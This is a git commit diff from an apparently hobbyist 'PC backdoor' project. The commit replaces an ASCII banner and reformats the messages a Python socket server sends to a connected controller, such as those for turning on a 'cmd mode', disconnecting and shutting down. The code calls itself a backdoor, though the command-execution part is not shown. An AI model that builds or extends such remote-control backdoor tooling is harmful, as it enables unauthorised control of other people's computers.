26dfae754f425567e63ec99a7c70c10afff5cc69
GTDT <66834354+GTDT@users.noreply.github.com>
2021-01-08 00:53:04 +0200

    Made ui little bit better & I still need to fix that but - When you connect server just closes.

--- ServerForPcBackdoor.py
+++ ServerForPcBackdoor.py
@@ -1,28 +1,25 @@
 """
-   _____________________________________________________________________________________________
-  |												|
-  |	_____/\\\\\\\\\\\\__/\\\\\\\\\\\\\\\__/\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\_ 		|
-  |	 ___/\\\//////////__\///////\\\/////__\/\\\////////\\\__\///////\\\/////__ 		|
-  |	  __/\\\___________________\/\\\_______\/\\\______\//\\\_______\/\\\_______ 		|
-  |	   _\/\\\____/\\\\\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_______ 		|
-  |	    _\/\\\___\/////\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_______ 		|
-  |	     _\/\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_______ 		|
-  |	      _\/\\\_______\/\\\_______\/\\\_______\/\\\_______/\\\________\/\\\_______ 	|
-  |	       _\//\\\\\\\\\\\\/________\/\\\_______\/\\\\\\\\\\\\/_________\/\\\_______ 	|
-  |	        __\////////////__________\///________\////////////___________\///________ 	|
-  |												|
-  |												|
-  |		   .----.   .--.   .---. .-. .-..----.  .----.  .----. .----.			|
-  |		   | {}  } / {} \ /  ___}| |/ / | {}  \/  {}  \/  {}  \| {}  }			|
-  |		   | {}  }/  /\  \\     }| |\ \ |     /\      /\      /| .-. \			|
-  |		   `----' `-'  `-' `---' `-' `-'`----'  `----'  `----' `-' `-'			|
-  |_____________________________________________________________________________________________|
-
+╔═════════════════════════════════════╗
+║─────────────────────────────────────║
+║─────────╔═══╦════╦═══╦════╗─────────║
+║─────────║╔═╗║╔╗╔╗╠╗╔╗║╔╗╔╗║─────────║
+║─────────║║─╚╩╝║║╚╝║║║╠╝║║╚╝─────────║
+║─────────║║╔═╗─║║──║║║║─║║───────────║
+║─────────║╚╩═║─║║─╔╝╚╝║─║║───────────║
+║─────────╚═══╝─╚╝─╚═══╝─╚╝───────────║
+║──╔══╗╔═══╦═══╦╗╔═╦═══╦═══╦═══╦═══╗──║
+║──║╔╗║║╔═╗║╔═╗║║║╔╩╗╔╗║╔═╗║╔═╗║╔═╗║──║
+║──║╚╝╚╣║─║║║─╚╣╚╝╝─║║║║║─║║║─║║╚═╝║──║
+║──║╔═╗║╚═╝║║─╔╣╔╗║─║║║║║─║║║─║║╔╗╔╝──║
+║──║╚═╝║╔═╗║╚═╝║║║╚╦╝╚╝║╚═╝║╚═╝║║║╚╗──║
+║──╚═══╩╝─╚╩═══╩╝╚═╩═══╩═══╩═══╩╝╚═╝──║
+║─────────────────────────────────────║
+╚═════════════════════════════════════╝
 """
 
 
 
-## Importing mudules.
+## Importing needed mudules.
 import socket
 
 ## Help command text.
@@ -49,7 +46,7 @@ def ListenAndAcceptConnection():
 	global controller
 	server.listen()
 	controller, address = server.accept()
-	controller.send("\n\n			Server:	You just connected to the server ".encode('utf-8'))
+	controller.send("\n\n  Server: You just connected to the server!".encode('utf-8'))
 
 ## Definition/Function with all the Functionality of the backdoor.
 def Functionality():
@@ -70,17 +67,17 @@ def Functionality():
 		## Command to turn cmd mode on.
 		if SCR == "CmdOn" or SCR == "CMDON" or SCR == "cmdon" or SCR == "Cmdon" or SCR == "cmdOn":
 			CmdMode = True
-			controller.send("\n\n			Server:	!! Cmd Mode Is On !!".encode('utf-8'))
+			controller.send("\n\n  Server: !! Cmd Mode Is On !!".encode('utf-8'))
 			continue
 
 		## Command to turn cmd mode off.
 		if SCR == "CmdOff" or SCR == "CMDOFF" or SCR == "cmdoff" or SCR == "Cmdoff" or SCR == "cmdOff":
 			CmdMode = False
-			controller.send("\n\n			Server:	!! Cmd Mode Is Off !!".encode('utf-8'))
+			controller.send("\n\n  Server: !! Cmd Mode Is Off !!".encode('utf-8'))
 
 		## Command to disconnect the user.
 		if SCR == "DISCONNECT" or SCR == "Disconnect" or SCR == "disconnect":
-			controller.send("\n\n			Server:	You just disconnected".encode('utf-8'))
+			controller.send("\n\n  Server: You just disconnected!".encode('utf-8'))
 			controller.close()
 			ReStart()
 
@@ -90,18 +87,18 @@ def Functionality():
 
 		## Exit command.
 		if SCR == "SERVERSHUTDOWN" or SCR == "ServerShutdown" or SCR == "Servershutdown" or SCR == "servershutdown" or SCR == "serverShutdown":
-			controller.send("\n\n			Server:	Confirm By Typing: 'Exit_Confirm_True'".encode('utf-8'))
+			controller.send("\n\n  Server: Confirm By Typing: Exit_Confirm_True".encode('utf-8'))
 			continue
 
 		## Exit confirmation that shuts down the server & user script.
 		if SCR == "Shutdown_The_Server_Confirm_True":
 			controller.send("".encode('utf-8'))
-			controller.send("\n\n			Server:	You closed server script".encode('utf-8'))
+			controller.send("\n\n  Server: You closed server script!".encode('utf-8'))
 			exit()
 
 		## If command is not detected send user that command is unknown.
 		else:
-			controller.send("\n\n			Server:	!!Unknown build in command!!".encode('utf-8'))
+			controller.send("\n\n  Server: !!Unknown build in command!!".encode('utf-8'))
 
 ## Definition/Function for starting the server.
 def Start():
